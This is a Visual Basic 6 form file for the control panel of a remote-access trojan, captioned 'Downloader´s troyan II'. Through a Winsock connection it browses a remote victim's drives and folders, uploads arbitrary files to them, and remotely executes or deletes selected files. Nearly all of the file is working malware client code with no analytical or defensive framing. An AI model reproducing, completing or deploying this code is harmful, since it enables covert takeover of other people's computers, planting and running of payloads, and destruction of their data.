VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form Form1 
   BackColor       =   &H80000007&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Downloader´s troyan II"
   ClientHeight    =   4380
   ClientLeft      =   150
   ClientTop       =   840
   ClientWidth     =   7065
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   4380
   ScaleWidth      =   7065
   StartUpPosition =   3  'Windows Default
   Begin MSComDlg.CommonDialog CommonDialog1 
      Left            =   2760
      Top             =   1920
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.PictureBox Picture1 
      Height          =   615
      Left            =   240
      Picture         =   "Form1.frx":030A
      ScaleHeight     =   555
      ScaleWidth      =   555
      TabIndex        =   4
      Top             =   4560
      Width           =   615
   End
   Begin MSComctlLib.ImageList ImageList1 
      Left            =   3240
      Top             =   2520
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   16
      ImageHeight     =   16
      MaskColor       =   12632256
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   20
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":0614
            Key             =   ""
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":0EEE
            Key             =   ""
         EndProperty
         BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":1BC8
            Key             =   ""
         EndProperty
         BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":28A2
            Key             =   ""
         EndProperty
         BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":317C
            Key             =   ""
         EndProperty
         BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":3A56
            Key             =   ""
         EndProperty
         BeginProperty ListImage7 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":3D70
            Key             =   ""
         EndProperty
         BeginProperty ListImage8 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":408A
            Key             =   ""
         EndProperty
         BeginProperty ListImage9 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":4964
            Key             =   ""
         EndProperty
         BeginProperty ListImage10 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":523E
            Key             =   ""
         EndProperty
         BeginProperty ListImage11 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":5B18
            Key             =   ""
         EndProperty
         BeginProperty ListImage12 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":5E32
            Key             =   ""
         EndProperty
         BeginProperty ListImage13 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":614C
            Key             =   ""
         EndProperty
         BeginProperty ListImage14 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":6A26
            Key             =   ""
         EndProperty
         BeginProperty ListImage15 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":7700
            Key             =   ""
         EndProperty
         BeginProperty ListImage16 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":83DA
            Key             =   ""
         EndProperty
         BeginProperty ListImage17 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":8CB4
            Key             =   ""
         EndProperty
         BeginProperty ListImage18 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":998E
            Key             =   ""
         EndProperty
         BeginProperty ListImage19 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":A268
            Key             =   ""
         EndProperty
         BeginProperty ListImage20 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "Form1.frx":AB42
            Key             =   ""
         EndProperty
      EndProperty
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   3360
      Top             =   1680
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H80000007&
      Height          =   4335
      Left            =   80
      TabIndex        =   0
      Top             =   0
      Width           =   6975
      Begin MSComctlLib.ImageCombo ImageCombo1 
         Height          =   330
         Left            =   120
         TabIndex        =   3
         Top             =   240
         Width           =   3975
         _ExtentX        =   7011
         _ExtentY        =   582
         _Version        =   393216
         ForeColor       =   -2147483640
         BackColor       =   -2147483643
         ImageList       =   "ImageList1"
      End
      Begin MSComctlLib.ListView ListView1 
         Height          =   3975
         Left            =   4080
         TabIndex        =   2
         Top             =   240
         Width           =   2775
         _ExtentX        =   4895
         _ExtentY        =   7011
         View            =   3
         LabelWrap       =   0   'False
         HideSelection   =   -1  'True
         HideColumnHeaders=   -1  'True
         _Version        =   393217
         ForeColor       =   -2147483640
         BackColor       =   -2147483643
         BorderStyle     =   1
         Appearance      =   1
         NumItems        =   1
         BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Object.Width           =   4304
         EndProperty
      End
      Begin MSComctlLib.TreeView TreeView1 
         Height          =   3615
         Left            =   75
         TabIndex        =   1
         Top             =   600
         Width           =   3975
         _ExtentX        =   7011
         _ExtentY        =   6376
         _Version        =   393217
         LineStyle       =   1
         Style           =   7
         ImageList       =   "ImageList1"
         Appearance      =   1
      End
   End
   Begin VB.Menu mnuconect 
      Caption         =   "Connection"
      Begin VB.Menu mnucon 
         Caption         =   "Connect"
      End
      Begin VB.Menu mnudes 
         Caption         =   "Desconnect"
         Enabled         =   0   'False
      End
      Begin VB.Menu linea1 
         Caption         =   "-"
      End
      Begin VB.Menu mnuexi 
         Caption         =   "Exit"
      End
   End
   Begin VB.Menu mnuopt 
      Caption         =   "Options"
      Begin VB.Menu mnuuplo 
         Caption         =   "Uploader"
      End
      Begin VB.Menu mnuexe 
         Caption         =   "Execute"
      End
      Begin VB.Menu mnudel 
         Caption         =   "Delete"
      End
      Begin VB.Menu mnuref 
         Caption         =   "Refrest"
      End
   End
   Begin VB.Menu menuabout 
      Caption         =   "About"
      Begin VB.Menu menuaut 
         Caption         =   "Author"
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Dim Shell_noty As New Class1
Dim s As Integer
Dim ret As Boolean
Private Sub Form_Load()

ListView1.SmallIcons = ImageList1
Me.Move (Screen.Width / 2) - (Me.Width / 2), ((Screen.Height - 315) / 2) - (Me.Height / 2)

End Sub


Private Sub Form_Resize()
If Me.WindowState = vbMinimized Then Shell_noty.ShellAdd
End Sub



Private Sub ListView1_DblClick()
Winsock1.SendData "exe" & rec & "\" & ListView1.SelectedItem
End Sub

Private Sub menuaut_Click()

Form5.Show vbModal
End Sub

Private Sub mnucon_Click()
Form2.Show vbModal
End Sub

Private Sub mnudel_Click()
If ListView1.SelectedItem <> "" Then
Winsock1.SendData "del" & rec & "\" & ListView1.SelectedItem
ListView1.ListItems.Remove ListView1.SelectedItem.Index
Else
MsgBox "He selects a file", vbCritical, "Trojan's Downloader"
End If
End Sub

Private Sub mnudes_Click()
mnucon.Enabled = True
mnudes.Enabled = False
Winsock1.Close
End Sub

Private Sub mnuexe_Click()
If ListView1.SelectedItem <> "" Then
Winsock1.SendData "exe" & rec & "\" & ListView1.SelectedItem
Else
MsgBox "He selects a file", vbCritical, "Trojan's Downloader"
End If
End Sub

Private Sub mnuexi_Click()
End
End Sub







Private Sub mnuref_Click()
On Error Resume Next
If rec <> "" Then TreeView1_DblClick
End Sub

Private Sub mnuuplo_Click()
Dim Buffer As String * 1024
Dim Man As String
On Error Resume Next
If rec = "" Then MsgBox "Selected Directory uploader", vbCritical, "Trojan's Downloader": Exit Sub
With CommonDialog1
.CancelError = True
.Filter = "*.*|*.*"
.ShowOpen
If Len(.FileName) = 0 Then Exit Sub
pah = rec & "\" & .FileTitle
Form3.UserControl11.Min = 0
Open .FileName For Binary As #1

Form3.UserControl11.Max = LOF(1)
Winsock1.SendData "arc" & Barrs(pah)
DoEvents
ret = True
Form4.Show
Do
DoEvents
Get #1, , Buffer
Man = Man & Buffer
Loop Until EOF(1)

Close #1
Winsock1.SendData Man
DoEvents
Form3.Show vbModal
End With


End Sub

Private Sub Picture1_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)

If Button = 1 Then s = s + 1
If Button = 2 Then PopupMenu mnuconect
If s = 2 Then
Shell_noty.ShellDel
s = 0
End If

End Sub

Private Sub TreeView1_Click()
On Error Resume Next
rec = TreeView1.SelectedItem.FullPath
End Sub

Public Sub TreeView1_DblClick()
If TreeView1.SelectedItem.Children = 0 Then
Winsock1.SendData "ide" & Barrs(TreeView1.SelectedItem.FullPath)
TreeView1.SelectedItem.Image = 5
Else
ListView1.ListItems.Clear
DoEvents
Winsock1.SendData "chi" & Barrs(TreeView1.SelectedItem.FullPath)
End If

End Sub

Private Sub Winsock1_Connect()
If Winsock1.State = sckConnected Then
Unload Form2
mnucon.Enabled = False
mnudes.Enabled = True
Winsock1.SendData "run" & "c:\"
End If
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
Dim g As String
Winsock1.GetData g

If Left(g, 3) = "uni" Then
v = Split(Mid(g, 4), ";")
For i = LBound(v) To UBound(v) - 1
If Left(v(i), 3) = "fix" Then ImageCombo1.ComboItems.Add , , Mid(v(i), 4), 1: ImageCombo1.ComboItems.Item(2).Selected = True: Set b = TreeView1.Nodes.Add(, , , Mid(v(i), 4), 1): TreeView1.SelectedItem = b
If Left(v(i), 3) = "cdr" Then ImageCombo1.ComboItems.Add , , Mid(v(i), 4), 3
If Left(v(i), 3) = "rem" Then ImageCombo1.ComboItems.Add , , Mid(v(i), 4), 2
Next i

End If
If Left(g, 3) = "fol" Then
DoEvents
v = Split(Mid(g, 4), ";")
For i = LBound(v) To UBound(v)
If Left(v(i), 3) = "fod" Then TreeView1.Nodes.Add TreeView1.SelectedItem.Index, tvwChild, , Mid(v(i), 4), 4: TreeView1.Nodes.Item(TreeView1.SelectedItem.Index).Expanded = True
If Left(v(i), 3) = "fie" Then ListView1.ListItems.Add , , Mid(v(i), 4), , Icons(Mid(v(i), 4))
Next i
b.Expanded = True
End If

If Left(g, 3) = "fil" Then
ListView1.ListItems.Clear
DoEvents
v = Split(Mid(g, 4), ";")
For i = LBound(v) To UBound(v)
If Left(v(i), 3) = "fie" Then ListView1.ListItems.Add , , Mid(v(i), 4), , Icons(Mid(v(i), 4))
Next i
End If

If Left(g, 3) = "msg" Then MsgBox Mid(g, 4), vbInformation, "Trojan's Downloader"
End Sub

Private Sub Winsock1_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Winsock1.Close
End Sub



Private Sub Winsock1_SendProgress(ByVal bytesSent As Long, ByVal bytesRemaining As Long)
If ret = True Then Form3.UserControl11.Value = Form3.UserControl11.Value + bytesSent
If Form3.UserControl11.Value >= Form3.UserControl11.Max Then ret = False
End Sub
